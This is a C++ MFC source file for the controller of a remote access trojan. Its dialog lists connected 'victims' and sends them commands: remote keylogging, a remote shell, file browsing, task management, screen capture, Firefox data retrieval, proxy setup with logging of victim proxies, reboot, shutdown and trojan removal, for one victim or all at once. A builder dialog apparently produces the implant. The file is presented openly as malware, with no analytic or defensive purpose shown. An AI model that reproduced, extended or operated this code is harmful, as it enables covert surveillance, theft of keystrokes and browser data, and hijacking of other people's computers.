// clientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "client.h"
#include "clientDlg.h"
#include "net.h"
#include "Settings.h"
#include "MessageBox.h"
#include "RShellSend.h"
#include "RShell.h"
#include "InfoDlg.h"
#include "FileList.h"
#include "FileBrowser.h"
#include "TaskMgrDlg.h"
#include "KeyloggerPathDlg.h"
#include "ProxySettingsDlg.h"
#include "BuilderDlg.h"
#include "MassInfo.h"
#include "CaptureScreenDlg.h"
#include "TransferDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientDlg dialog

CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CClientDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CClientDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CClientDlg)
	DDX_Control(pDX, IDCLIST, m_VictimList);
	DDX_Control(pDX, IDC_STATUSBAR, m_StatusBar);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialog)
	//{{AFX_MSG_MAP(CClientDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDCLOSE, OnClose)
	ON_WM_CONTEXTMENU()
	ON_COMMAND(ID_POPUP_CONNECTIVITY_DISCONNECT, OnPopupConnectivityDisconnect)
	ON_COMMAND(ID_POPUP_WINDOWS_MESSAGEBOX, OnPopupWindowsMessagebox)
	ON_COMMAND(ID_POPUP_WINDOWS_STARTSHELL, OnPopupWindowsStartshell)
	ON_COMMAND(ID_POPUP_WINDOWS_SYSTEMINFO, OnPopupWindowsSysteminfo)
	ON_COMMAND(ID_POPUP_SYSTEM_FILEBROWSER, OnPopupSystemFilebrowser)
	ON_COMMAND(ID_POPUP_REMOVE, OnPopupRemove)
	ON_COMMAND(ID_POPUP_SYSTEM_TASKMGR, OnPopupSystemTaskmgr)
	ON_COMMAND(ID_POPUP_WINDOWS_REBOOT, OnPopupWindowsReboot)
	ON_COMMAND(ID_POPUP_WINDOWS_SHUTDOWN, OnPopupWindowsShutdown)
	ON_COMMAND(ID_POPUP_WINDOWS_KEYLOGGER, OnPopupWindowsKeylogger)
	ON_BN_CLICKED(IDC_ABOUT, OnAbout)
	ON_COMMAND(ID_POPUP_SYSTEM_PROXY, OnPopupSystemProxy)
	ON_BN_CLICKED(IDC_BUILDB, OnBuildb)
	ON_COMMAND(ID_COPY_IP, OnCopyIp)
	ON_COMMAND(ID_COPY_ALL, OnCopyAll)
	ON_COMMAND(ID_POPUP_MASS_KEYLOGGER_ON, OnPopupMassKeyloggerOn)
	ON_COMMAND(ID_POPUP_MASS_KEYLOGGER_OFF, OnPopupMassKeyloggerOff)
	ON_COMMAND(ID_POPUP_MASS_PROXY_OFF, OnPopupMassProxyOff)
	ON_COMMAND(ID_POPUP_MASS_PROXY_ON, OnPopupMassProxyOn)
	ON_COMMAND(ID_POPUP_MASS_DISCONNECT, OnPopupMassDisconnect)
	ON_COMMAND(ID_POPUP_MASS_REMOVE, OnPopupMassRemove)
	ON_COMMAND(ID_POPUP_FIREFOX, OnPopupFirefox)
	ON_COMMAND(ID_POPUP_MASS_FIREFOX, OnPopupMassFirefox)
	ON_COMMAND(ID_POPUP_CAPTURE_SCREEN, OnPopupCaptureScreen)
	ON_COMMAND(ID_POPUP_CAPTURE_SCREEN_SEND, OnPopupCaptureScreenSend)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_NET_MESSAGE, OnNetMessage)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientDlg message handlers

BOOL CClientDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_VictimList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES );

	LVCOLUMN lvColumn;
	int nCol;

	//ServerList
	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 40;
	lvColumn.pszText = "Place";
	nCol = m_VictimList.InsertColumn(0, &lvColumn);

	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 30;
	lvColumn.pszText = "ID";
	m_VictimList.InsertColumn(1, &lvColumn);

	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 130;
	lvColumn.pszText = "Name";
	m_VictimList.InsertColumn(2, &lvColumn);

	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 100;
	lvColumn.pszText = "Address";
	m_VictimList.InsertColumn(3, &lvColumn);

	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 60;
	lvColumn.pszText = "Keylogger";
	m_VictimList.InsertColumn(4, &lvColumn);

	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 60;
	lvColumn.pszText = "Proxy";
	m_VictimList.InsertColumn(5, &lvColumn);

	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 50;
	lvColumn.pszText = "Ping";
	m_VictimList.InsertColumn(6, &lvColumn);

	lvColumn.mask = LVCF_FMT | LVCF_TEXT | LVCF_WIDTH;
	lvColumn.fmt = LVCFMT_LEFT;
	lvColumn.cx = 50;
	lvColumn.pszText = "Version";
	m_VictimList.InsertColumn(7, &lvColumn);

	LVITEM		lvItem;
	int			nItem;
	char		buff[16];
	int			i = 0;

	if (MaxSimVictims > MAX_SIM_VICTIMS)
		MaxSimVictims = MAX_SIM_VICTIMS;

	for (i = 0; i < MaxSimVictims; i++)
	{
		lvItem.mask = LVIF_TEXT;
		lvItem.iItem = i;
		lvItem.iSubItem = 0;

		_snprintf(buff, sizeof(buff) - 1, "%d", i);
		lvItem.pszText = buff;
		nItem = m_VictimList.InsertItem(&lvItem);
	}

	NETSTRUCT net;
	net.hWnd = GetSafeHwnd();
	net.port = ListenPort;
	net.maxvicts = MaxSimVictims;

	CWinThread* pThread = AfxBeginThread(NET_Thread, (LPVOID)&net);
	Sleep(50);
	pThread = AfxBeginThread(NET_PingThread, (LPVOID)&net);
	Sleep(50);
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CClientDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CClientDlg::OnClose() 
{
	NET_CloseConnections();
	CDialog::OnOK();	
}

LRESULT CClientDlg::OnNetMessage(UINT wParam, LONG lParam)
{
	char	buffer[MAX_BUFF_SIZE];

	if (wParam == 0)
		m_StatusBar.SetWindowText(NetMessage);
	else if (wParam == 1)
	{
		//EnterCriticalSection(&cs);
		_snprintf(buffer, sizeof(buffer) - 1, "New victim connected: %s (%s)", cndata[lParam].name, cndata[lParam].ip);
		//LeaveCriticalSection(&cs);
		m_StatusBar.SetWindowText(buffer);
		DisplayNewVictim(lParam);
	}
	else if (wParam == 2)
	{
		m_StatusBar.SetWindowText(NetMessage);
		RemoveVictim(lParam);
	}
	else if (wParam == 3)
	{
		//EnterCriticalSection(&cs);
		_snprintf(buffer, sizeof(buffer) - 1, "%s (%s):\r\nRemote keylogger status: %s", 
			cndata[lParam].name, cndata[lParam].ip, NetMessage);
		//LeaveCriticalSection(&cs);
		if (NetMessage == "failed")
		{
			cndata[lParam].bkeylogging = false;
			m_VictimList.SetItemText(lParam, 4, "");
		}

		AfxMessageBox(buffer, MB_OK);
	}
	else if (wParam == 4)
	{
		//EnterCriticalSection(&cs);
		_snprintf(buffer, sizeof(buffer) - 1, "%s (%s):\r\nRemote proxy status: %s", 
			cndata[lParam].name, cndata[lParam].ip, NetMessage);
		//LeaveCriticalSection(&cs);
		if (NetMessage == "failed")
		{
			cndata[lParam].proxy[0] = 0;
			m_VictimList.SetItemText(lParam, 5, "");
		}

		AfxMessageBox(buffer, MB_OK);
	}
	else if (wParam == 5)
	{
		CTransferDlg trans;

		trans.bindport = TransferPort;
		trans.transfer = 1;
		trans.fsize = atoi(NetMessage);
		_snprintf(trans.remotefile, sizeof(trans.remotefile) - 1, "\\screenshot-%d-%s-%d.bmp", cndata[lParam].id, cndata[lParam].ip, GetTickCount());
		trans.DoModal();
	}
	else if (wParam == 6)
	{
		//EnterCriticalSection(&cs);
		_snprintf(buffer, sizeof(buffer) - 1, "%s (%s):\r\nRemote capture status: %s", 
			cndata[lParam].name, cndata[lParam].ip, NetMessage);
		//LeaveCriticalSection(&cs);

		AfxMessageBox(buffer, MB_OK);
	}
	else if (wParam == 100)
	{
		//EnterCriticalSection(&cs);
		_snprintf(buffer, sizeof(buffer) - 1, "%d", cndata[lParam].ping);
		//LeaveCriticalSection(&cs);
		m_VictimList.SetItemText(lParam, 6, buffer);
	}

	return 0;
}


void CClientDlg::DisplayNewVictim(int i)
{
	char		buff[16];
//EnterCriticalSection(&cs);
	_snprintf(buff, sizeof(buff) - 1, "%d", cndata[i].id);
	m_VictimList.SetItemText(i, 1, buff);
	m_VictimList.SetItemText(i, 2, cndata[i].name);
	m_VictimList.SetItemText(i, 3, cndata[i].ip);
	if (cndata[i].bkeylogging)
		m_VictimList.SetItemText(i, 4, "On");
	m_VictimList.SetItemText(i, 5, cndata[i].proxy);
	m_VictimList.SetItemText(i, 7, cndata[i].pversion);
//LeaveCriticalSection(&cs);
}


void CClientDlg::RemoveVictim(int i)
{
	m_VictimList.SetItemText(i, 1, "");
	m_VictimList.SetItemText(i, 2, "");
	m_VictimList.SetItemText(i, 3, "");
	m_VictimList.SetItemText(i, 4, "");
	m_VictimList.SetItemText(i, 5, "");
	m_VictimList.SetItemText(i, 6, "");
	m_VictimList.SetItemText(i, 7, "");
}


int CClientDlg::GetCurrentSelection()
{
	int		i;
	char	buff[MAX_BUFF_SIZE];
	
	i = m_VictimList.GetNextItem( -1, LVNI_ALL | LVNI_SELECTED);
		
	if (i < 0)
		return -1;

	m_VictimList.GetItemText(i, 1, buff, sizeof(buff));
	if (strlen(buff) == 0)
		return -1;

	return i;
}


void CClientDlg::OnContextMenu(CWnd* pWnd, CPoint point) 
{
	if (GetCurrentSelection() < 0)
		return;

	if((point.x == -1) && (point.y == -1))
	{
		// Keystroke invocation
		CRect rect;

		GetClientRect(rect);
		ClientToScreen(rect);

		point = rect.TopLeft();
		point.Offset(5, 5);
	}

	CMenu menu;
	VERIFY(menu.LoadMenu(IDR_POPUP));

	CMenu* pPopup = menu.GetSubMenu(0);
	ASSERT(pPopup != NULL);
	CWnd* pWndPopupOwner = this;

	while(pWndPopupOwner->GetStyle() & WS_CHILD)
		pWndPopupOwner = pWndPopupOwner->GetParent();

	pPopup->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, 
								point.x, 
								point.y,
								pWndPopupOwner);	
}

void CClientDlg::OnPopupConnectivityDisconnect() 
{
	int		i;

	i = GetCurrentSelection();

	NET_Send(i, DIE, NULL);
}

void CClientDlg::OnPopupWindowsMessagebox() 
{
	CMessageBox c;
	
	if (c.DoModal() == IDOK)
	{
		int		i;

		i = GetCurrentSelection();

		NET_Send(i, MSGBOX, MsgBoxText);
	}
}

void CClientDlg::OnPopupWindowsStartshell() 
{
	CurrentSelection = GetCurrentSelection();

	CRShell crs;
	crs.DoModal();
}

void CClientDlg::OnPopupWindowsSysteminfo() 
{
	CurrentSelection = GetCurrentSelection();

	CInfoDlg infdlg;
	infdlg.infotype = SYSTEMINFO;
	infdlg.DoModal();
}

void CClientDlg::OnPopupSystemFilebrowser() 
{
	CurrentSelection = GetCurrentSelection();

	CFileBrowser fb;
	fb.DoModal();
}

void CClientDlg::OnPopupRemove() 
{
	if (AfxMessageBox("Are you sure you want to uninstall trojan from remote host?", MB_YESNO | MB_ICONQUESTION) == IDYES)
	{
		int	i = GetCurrentSelection();

		NET_Send(i, UNINSTALL, NULL);
	}
}

void CClientDlg::OnPopupSystemTaskmgr() 
{
	CurrentSelection = GetCurrentSelection();
	
	CTaskMgrDlg	taskmgr;
	taskmgr.DoModal();
}

void CClientDlg::OnPopupWindowsReboot() 
{
	int	i = GetCurrentSelection();

	NET_Send(i, REBOOT, NULL);
}

void CClientDlg::OnPopupWindowsShutdown() 
{
	int	i = GetCurrentSelection();

	NET_Send(i, SHUTDOWN, NULL);
}

void CClientDlg::OnPopupWindowsKeylogger() 
{
	int i = GetCurrentSelection();

	if (cndata[i].bkeylogging)
	{
		if (AfxMessageBox("Keylogger active.\r\nTurning off?", MB_YESNO | MB_ICONQUESTION) == IDYES)
		{
			NET_Send(i, KEYLOGGER, "off");
			//EnterCriticalSection(&cs);
			cndata[i].bkeylogging = false;
			//LeaveCriticalSection(&cs);
			m_VictimList.SetItemText(i, 4, "");
		}
	}
	else
	{
		CKeyloggerPathDlg kpd;
		if (kpd.DoModal() == IDOK)
		{
			NET_Send(i, KEYLOGGER, kpd.path);
			//EnterCriticalSection(&cs);
			cndata[i].bkeylogging = true;
			//LeaveCriticalSection(&cs);
			m_VictimList.SetItemText(i, 4, "On");
		}
	}
}

void CClientDlg::OnAbout() 
{
	CAboutDlg ad;
	ad.DoModal();
}

void CClientDlg::OnPopupSystemProxy() 
{
	int i = GetCurrentSelection();

	if (cndata[i].proxy[0] != 0)
	{
		if (AfxMessageBox("Proxy active.\r\nTurning off?", MB_YESNO | MB_ICONQUESTION) == IDYES)
		{
			NET_Send(i, PROXY, "off");
			//EnterCriticalSection(&cs);
			cndata[i].proxy[0] = 0;
			//LeaveCriticalSection(&cs);
			m_VictimList.SetItemText(i, 5, "");
		}
	}
	else
	{
		CProxySettingsDlg psd;
		if (psd.DoModal() == IDOK)
		{
			char	temp[512];

			if (psd.keepalive)
				_snprintf(temp, sizeof(temp) - 1, "%d 1\"%d\"%s", psd.port, psd.timeout, psd.path);
			else
				_snprintf(temp, sizeof(temp) - 1, "%d 0\"%d\"%s", psd.port, psd.timeout, psd.path);
			NET_Send(i, PROXY, temp);
			//EnterCriticalSection(&cs);
			_snprintf(cndata[i].proxy, sizeof(cndata[i].proxy) - 1, "On:%d", psd.port);
			//LeaveCriticalSection(&cs);
			m_VictimList.SetItemText(i, 5, cndata[i].proxy);
		}
	}
}

void CClientDlg::OnBuildb() 
{
	CBuilderDlg bdlg;
	bdlg.DoModal();
}

void CClientDlg::CopyToClipboard(CString source)
{
	if(OpenClipboard())
	{
		HGLOBAL clipbuffer;
		char * buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, source.GetLength()+1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy(buffer, LPCSTR(source));
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT,clipbuffer);
		CloseClipboard();
	}
}

void CClientDlg::OnCopyIp() 
{
	int i = GetCurrentSelection();

	//EnterCriticalSection(&cs);
	CopyToClipboard(cndata[i].ip);
	//LeaveCriticalSection(&cs);
}

void CClientDlg::OnCopyAll() 
{
	int i = GetCurrentSelection();
	char	buff[256];

	//EnterCriticalSection(&cs);
	_snprintf(buff, sizeof(buff) - 1, "%s | %s | %s", cndata[i].name, cndata[i].ip, cndata[i].pversion);
	//LeaveCriticalSection(&cs);

	CopyToClipboard(buff);
	
}

void CClientDlg::OnPopupMassKeyloggerOn() 
{
	int		i;

	CKeyloggerPathDlg kpd;
	if (kpd.DoModal() == IDOK)
	{
		for (i = 0; i < MaxSimVictims; i++)
		{
			if (!cndata[i].bkeylogging && cndata[i].id > 0)
			{
				NET_Send(i, KEYLOGGER, kpd.path);
					//EnterCriticalSection(&cs);
				cndata[i].bkeylogging = true;
					//LeaveCriticalSection(&cs);
				m_VictimList.SetItemText(i, 4, "On");
			}
		}
	}
}

void CClientDlg::OnPopupMassKeyloggerOff() 
{
	int		i;

	if (AfxMessageBox("Turning off keylogger on all victims?", MB_YESNO | MB_ICONQUESTION) == IDYES)
	{
		for (i = 0; i < MaxSimVictims; i++)
		{
			if (cndata[i].bkeylogging && cndata[i].id > 0)
			{
				NET_Send(i, KEYLOGGER, "off");
				//EnterCriticalSection(&cs);
				cndata[i].bkeylogging = false;
				//LeaveCriticalSection(&cs);
				m_VictimList.SetItemText(i, 4, "");
			}
		}
	}
}

void CClientDlg::OnPopupMassProxyOff() 
{
	int		i;

	if (AfxMessageBox("Turning off proxy on all victims?", MB_YESNO | MB_ICONQUESTION) == IDYES)
	{
		for (i = 0; i < MaxSimVictims; i++)
		{
			if (cndata[i].proxy[0] != 0 && cndata[i].id > 0)
			{

				NET_Send(i, PROXY, "off");
				//EnterCriticalSection(&cs);
				cndata[i].proxy[0] = 0;
				//LeaveCriticalSection(&cs);
				m_VictimList.SetItemText(i, 5, "");
				
			}
		}
	}
}

void CClientDlg::OnPopupMassProxyOn() 
{
	int		i;
	FILE	*f;
	char	temp[512], temp2[128];

	CProxySettingsDlg psd;
	if (psd.DoModal() == IDOK)
	{
		if (AfxMessageBox("Log all proxies into proxy.txt file?", MB_YESNO | MB_ICONQUESTION) == IDYES)
			f = fopen("proxy.txt", "wb");

		if (psd.keepalive)
			_snprintf(temp, sizeof(temp) - 1, "%d 1\"%d\"%s", psd.port, psd.timeout, psd.path);
		else
			_snprintf(temp, sizeof(temp) - 1, "%d 0\"%d\"%s", psd.port, psd.timeout, psd.path);

		for (i = 0; i < MaxSimVictims; i++)
		{
			if (cndata[i].proxy[0] == 0 && cndata[i].id > 0)
			{
				NET_Send(i, PROXY, temp);
				//EnterCriticalSection(&cs);
				_snprintf(cndata[i].proxy, sizeof(cndata[i].proxy) - 1, "On:%d", psd.port);
				//LeaveCriticalSection(&cs);
				m_VictimList.SetItemText(i, 5, cndata[i].proxy);

				if (f != NULL)
				{
					_snprintf(temp2, sizeof(temp2) - 1, "%s:%d\r\n", cndata[i].ip, psd.port);
					fputs(temp2, f);
				}
			}
		}

		if (f != NULL)
			fclose(f);
	}
}

void CClientDlg::OnPopupMassDisconnect() 
{
	int		i;

	if (AfxMessageBox("Are you sure you want to disconnect all victims?", MB_YESNO | MB_ICONQUESTION) == IDYES)
	{
		for (i = 0; i < MaxSimVictims; i++)
		{
			if (cndata[i].id > 0)
			{
				NET_Send(i, DIE, NULL);
			}
		}
	}
}

void CClientDlg::OnPopupMassRemove() 
{
	int		i;

	if (AfxMessageBox("Are you sure you want to uninstall trojan from all victims?", MB_YESNO | MB_ICONQUESTION) == IDYES)
	{
		for (i = 0; i < MaxSimVictims; i++)
		{
			if (cndata[i].id > 0)
			{
				NET_Send(i, DIE, NULL);
			}
		}
	}
}

void CClientDlg::OnPopupFirefox() 
{
	CurrentSelection = GetCurrentSelection();

	CInfoDlg infdlg;
	infdlg.infotype = FF;
	infdlg.DoModal();
}

void CClientDlg::OnPopupMassFirefox() 
{
	CMassInfo cmf;
	cmf.victims = MaxSimVictims;
	cmf.DoModal();
}

void CClientDlg::OnPopupCaptureScreen() 
{
	int		i = GetCurrentSelection();
	char	temp[MAX_PATH];

	CCaptureScreenDlg csdlg;
	if (csdlg.DoModal() == IDOK)
	{
		_snprintf(temp, sizeof(temp) - 1, "0\"%s", csdlg.file);
		NET_Send(i, CAPTURESCREEN, temp);
	}
}

void CClientDlg::OnPopupCaptureScreenSend() 
{
	int		i = GetCurrentSelection();
	char	temp[32];

	_snprintf(temp, sizeof(temp) - 1, "1\"%d", TransferPort);
	NET_Send(i, CAPTURESCREEN, temp);
}
